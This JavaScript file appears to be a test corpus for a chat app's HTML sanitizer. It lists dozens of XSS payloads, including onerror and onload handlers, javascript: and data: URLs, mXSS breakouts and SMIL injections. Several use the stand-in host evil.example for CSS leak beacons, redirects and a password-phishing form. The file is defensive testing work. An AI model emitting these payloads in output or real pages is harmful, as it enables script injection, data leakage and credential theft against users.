// Corpus for run.cjs. Every `text` is raw model output and goes through the
// production path: processResponse -> renderChatHtml -> stripActiveContent
// -> sanitizeHtml. `pwn(...)` is the trap the harness installs on window;
// any call, dialog, or request leaving the harness origin fails the vector.
//
// The markdown pipeline entity-escapes tags it does not recognise, so HTML
// vectors ride inside the carriers it preserves verbatim: raw <svg>/<img>/
// <video>, <<DEMO>> SVG, <<SOURCES>> links, Desmos placeholders and the
// chat-demo-block div (a model can emit that div directly).

const carrier = (inner) => `<div class="chat-demo-block"><div class="chat-demo-title">t</div>${inner}</div>`;
const demo = (svgInner, attrs = "") =>
  `<<DEMO title="d">><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"${attrs}>${svgInner}</svg><<END_DEMO>>`;

exports.xss = [
  { name: "img onerror, quoted", text: 'See <img src="/nope.png" onerror="pwn(\'img\')">' },
  { name: "img onerror, bare + mixed case", text: "<img src=/nope.png ONERROR=pwn(1)>" },
  { name: "img onerror, entity-encoded body", text: '<img src="/nope.png" onerror="&#112;&#119;&#110;(1)">' },
  { name: "svg onload", text: '<svg onload="pwn(1)" viewBox="0 0 10 10"><circle r="3"/></svg>' },
  { name: "DEMO svg onload + rect onclick", text: demo('<rect width="5" height="5" onclick="pwn(1)"/>', ' onload="pwn(1)"') },
  { name: "SOURCES javascript: href", text: "<<SOURCES>>\n- [click](javascript:pwn(1))\n<<END_SOURCES>>" },
  { name: "SOURCES javascript: href, tab-split", text: "<<SOURCES>>\n- [click](java\tscript:pwn(1))\n<<END_SOURCES>>" },
  { name: "SOURCES javascript: href, entity-encoded", text: "<<SOURCES>>\n- [click](&#106;avascript:pwn(1))\n<<END_SOURCES>>" },
  { name: "SOURCES data:text/html href", text: "<<SOURCES>>\n- [click](data:text/html;base64,PHNjcmlwdD5wYXJlbnQucHduKDEpPC9zY3JpcHQ+)\n<<END_SOURCES>>" },
  { name: "svg a xlink:href javascript:", text: '<svg viewBox="0 0 10 10"><a xlink:href="javascript:pwn(1)"><text y="5">c</text></a></svg>' },
  { name: "svg a href javascript:, hex entity", text: '<svg viewBox="0 0 10 10"><a href="&#x6A;avascript:pwn(1)"><text y="5">c</text></a></svg>' },
  { name: "script in markdown prose", text: "Hello <script>pwn(1)</script> world" },
  { name: "script inside chat-demo-block carrier", text: carrier("<script>pwn(1)</script>") },
  { name: "script inside raw svg", text: '<svg viewBox="0 0 10 10"><script>pwn(1)</script></svg>' },
  { name: "script inside DEMO svg (xlink href)", text: demo('<script xlink:href="https://evil.example/x.js"></script><script>pwn(1)</script>') },
  { name: "foreignObject with img onerror", text: '<svg viewBox="0 0 10 10"><foreignObject><img src="/nope.png" onerror="pwn(1)"></foreignObject></svg>' },
  { name: "DEMO foreignObject xhtml body", text: demo('<foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml" onload="pwn(1)"><img src="/nope.png" onerror="pwn(1)"/></body></foreignObject>') },
  { name: "iframe srcdoc", text: carrier('<iframe srcdoc="<script>parent.pwn(1)</script>"></iframe>') },
  { name: "object data javascript:", text: carrier('<object data="javascript:pwn(1)"></object>') },
  { name: "embed data:text/html", text: carrier('<embed src="data:text/html,<script>parent.pwn(1)</script>">') },
  { name: "svg use external href", text: '<svg viewBox="0 0 10 10"><use href="https://evil.example/x.svg#y"/></svg>' },
  { name: "svg use external xlink:href", text: '<svg viewBox="0 0 10 10"><use xlink:href="https://evil.example/x.svg#y"/></svg>' },
  { name: "svg image data:text/html", text: '<svg viewBox="0 0 10 10"><image href="data:text/html,<script>pwn(1)</script>" width="5" height="5"/></svg>' },
  { name: "svg feImage external", text: '<svg viewBox="0 0 10 10"><filter id="f"><feImage href="https://evil.example/leak.png"/></filter><rect filter="url(#f)" width="5" height="5"/></svg>' },
  { name: "css url() exfil in svg style", text: '<svg viewBox="0 0 10 10"><rect width="5" height="5" style="fill:url(https://evil.example/leak)"/></svg>' },
  { name: "css url() exfil in img style", text: '<img src="/nope.png" style="background:url(https://evil.example/leak)">' },
  { name: "css url() exfil, escaped u\\75rl", text: '<img src="/nope.png" style="background:\\75rl(https://evil.example/leak)">' },
  { name: "css url() exfil via presentation attr", text: '<svg viewBox="0 0 10 10"><rect width="5" height="5" fill="url(https://evil.example/leak#p)"/></svg>' },
  { name: "style element inside svg (@import + body hide)", text: '<svg viewBox="0 0 10 10"><style>@import url(https://evil.example/leak.css); body{display:none}</style></svg>' },
  { name: "mXSS: p breaks out of svg into html style", text: '<svg viewBox="0 0 10 10"><p><style><img src="/nope.png" onerror="pwn(1)"></style></p></svg>' },
  { name: "template with img onerror", text: carrier('<template><img src="/nope.png" onerror="pwn(1)"></template>') },
  { name: "base + meta refresh", text: carrier('<base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example/">') },
  { name: "form phish", text: carrier('<form action="https://evil.example/phish"><input name="pw"><button>Login</button></form>') },
  { name: "SMIL set href to javascript:", text: '<svg viewBox="0 0 10 10"><a><set attributeName="href" to="javascript:pwn(1)"/><text y="5">c</text></a></svg>' },
  { name: "SMIL animate xlink:href", text: '<svg viewBox="0 0 10 10"><a><animate attributeName="xlink:href" values="javascript:pwn(1)"/><text y="5">c</text></a></svg>' },
  { name: "desmos placeholder with onclick", text: '<div class="chat-desmos-block" data-desmos-state="e30=" onclick="pwn(1)"></div>' },
  { name: "video javascript: src/poster + source onerror", text: '<video src="javascript:pwn(1)" poster="javascript:pwn(1)"><source src="data:text/html,x" onerror="pwn(1)"></video>' },
  { name: "markdown image alt breakout", text: '![a" onerror="pwn(1)](/nope.png)' },
  { name: "markdown image src breakout", text: '![a](/nope.png" onerror="pwn(1))' },
  { name: "position:fixed overlay", text: carrier('<span style="position:fixed;inset:0;background:#fff">Enter your password</span>') },
  { name: "svg xmlns confusion (xhtml namespace)", text: demo('<g xmlns="http://www.w3.org/1999/xhtml"><img src="/nope.png" onerror="pwn(1)"/></g>') },
];

exports.benign = [
  { name: "math inline + display + \\( \\)", text: "The energy is $E = mc^2$ and\n\n$$\\int_0^1 x^2\\,dx = \\frac{1}{3}$$\n\nwith \\(\\alpha + \\beta\\) inline and \\sqrt{2} bare." },
  { name: "table", text: "| a | b |\n|---|---|\n| 1 | 2 |\n| 3 | 4 |" },
  { name: "code fence + inline code", text: "```js\nconst x = 1 < 2 && 3 > 1;\n```\nand `inline <code>` here." },
  { name: "DEMO graph (title, sizing, defs, use, marker, gradient, style)", text: '<<DEMO title="Sine wave">><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100" width="200" height="100"><title>Sine wave</title><desc>y = sin x</desc><defs><linearGradient id="g"><stop offset="0" stop-color="#48f"/><stop offset="1" stop-color="#4f8"/></linearGradient><marker id="m" markerWidth="4" markerHeight="4" refX="2" refY="2" orient="auto"><path d="M0 0L4 2L0 4z" fill="#333"/></marker><symbol id="dot" viewBox="0 0 4 4"><circle cx="2" cy="2" r="2"/></symbol></defs><path d="M0 50 C 25 0, 50 0, 75 50 S 125 100, 150 50 S 200 0, 200 50" fill="none" stroke="url(#g)" stroke-width="2" marker-end="url(#m)"/><text x="10" y="90" font-size="10" style="font-family:monospace">y = sin x</text><use href="#dot" x="100" y="48" width="4" height="4"/><rect x="0" y="0" width="200" height="100" fill="none" stroke="#999"><animate attributeName="opacity" values="1;0.5;1" dur="2s" repeatCount="indefinite"/></rect></svg><<END_DEMO>>' },
  { name: "markdown image + raw img", text: 'Here is the plot:\n\n![plot of x^2](/img/plot.png)\n\nand a raw one <img src="/img/b.png" alt="b" width="120">.' },
  { name: "data:image img", text: '<img src="data:image/png;base64,iVBORw0KGgo=" alt="tiny">' },
  { name: "headings, lists, emphasis, hr", text: "## Steps\n- **first** item\n- second *item*\n1. one\n2. two\n\n---\nDone." },
  { name: "SOURCES links", text: "<<SOURCES>>\n- [Griffiths](https://example.com/griffiths)\n- Plain note\n<<END_SOURCES>>" },
  { name: "DESMOS placeholder", text: '<<DESMOS>>{"expressions":{"list":[{"id":"1","latex":"y=x^2"}]}}<<END_DESMOS>>' },
  { name: "markdown video", text: "![clip](/media/clip.mp4)" },
];
